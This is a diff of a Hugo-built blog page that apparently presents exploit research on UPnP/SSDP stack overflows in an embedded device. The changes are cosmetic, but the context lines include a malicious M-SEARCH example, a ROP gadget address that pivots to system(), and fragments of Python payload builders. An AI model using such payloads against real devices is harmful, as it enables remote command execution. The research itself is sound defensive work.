@@ -20,7 +20,7 @@
 
 
 
-<script defer language="javascript" type="text/javascript" src="/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.d451ff92e80abc2a828eb9bb262e4db374bd4e954642f9245c54eec84bf690f3.js"></script>
 
 
 
@@ -103,13 +103,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.147.3">
+<meta name="generator" content="Hugo 0.155.2">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.607435cac0c3b4b44373c5634a7dd4f3b5b8f756061890d922e60e385c6d551f.css">
 
 
     
@@ -309,7 +309,7 @@
         <p class="footnote">
 powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
     <br>
-    &copy; 2025 draz.sh. All rights reserved.
+    &copy; 2026 draz.sh. All rights reserved.
 </p>
 
   </div>
@@ -368,7 +368,7 @@ MAN: &#34;ssdp:discover&#34;
 MX: 3
 ST: upnp:rootdevice
 </code></pre><p>We crafted a malicious M-SEARCH request that overwrites the return address and redirects execution to a ROP gadget at <code>0x2d4dc</code> (<code>mov r0, r5; bl system</code>) to execute arbitrary shell commands.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>payload_pt1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Z&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">304</span> <span style="color:#75715e"># padding</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>payload_pt1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Z&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">304</span> <span style="color:#75715e"># padding</span>
 </span></span><span style="display:flex;"><span>payload_pt2 <span style="color:#f92672">=</span> (
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># R4</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># R5 (command string here)</span>
@@ -399,7 +399,7 @@ ST: upnp:rootdevice
 <pre tabindex="0"><code>ST: uuid:schemas:device:AAAAAAAAAAAAAAAAAAAAAAAAAAAA...:
 </code></pre><p>&hellip;the <code>n</code> calculation stretches all the way to the next delimiter, and if it&rsquo;s placed far away, <code>n</code> becomes massive, allowing <code>strncpy</code> to copy past the stack buffer. This parsing logic assumes the input will be nice and well-formed, but it won&rsquo;t be for a malicious request.</p>
 <p>And again, we can overwrite the return address and pivot to a <code>system()</code> call:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Z&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">284</span> <span style="color:#f92672">+</span>  <span style="color:#75715e"># padding</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>    <span style="color:#75715e"># R4</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span>    <span style="color:#75715e"># R5 (command string here)</span>
